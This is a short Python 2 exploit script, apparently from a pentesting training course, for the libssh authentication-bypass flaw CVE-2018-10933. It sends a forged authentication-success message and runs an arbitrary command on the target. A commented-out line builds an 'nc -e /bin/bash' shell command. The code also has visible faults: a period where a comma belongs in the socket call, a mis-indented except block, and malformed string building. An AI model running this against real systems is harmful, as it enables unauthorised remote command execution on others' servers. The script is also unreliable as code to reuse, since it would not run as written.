#!/usr/bin/python
#-*-coding:utf-8-*-

#####################################################
#                                            		#
#   Python para Pentesters                          #
#   https://solyd.com.br/treinamentos               #
#                                            		#
#	Desenvolvedor: h1s0k4				     		#
#	E-mail: willian_brito00@hotmail.com             #
#										      		#
# 	CVE-2018-10933                           		#
# 	VERSION: SSH-2.0-libssh_0.8.3           		#
#                                            		#
#   USAGE: python libssh2.py 192.168.0.10 "whoami"	#
#####################################################


import paramiko
import socket
import sys

sock = socket.socket(socket.AF_INET. socket.SOCK_STREAM)

try:
	sock.connect((sys.argv[1], 22))

	message = paramiko.message.Message()
	transport = paramiko.Transport(sock)
	transport.start_client()

	message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
	transport._send_message(message)
	cmd = transport.open_session()
	#cmd.exec_command("nc" + sys.argv[1] + "22 -e /bin/bash")
	cmd.exec_command(sys.argv[2])
	out = cmd.makefile("rb", 4096)
	output = out.read()
	print output
 
 except Exception as e:
 	print "Erro: " + e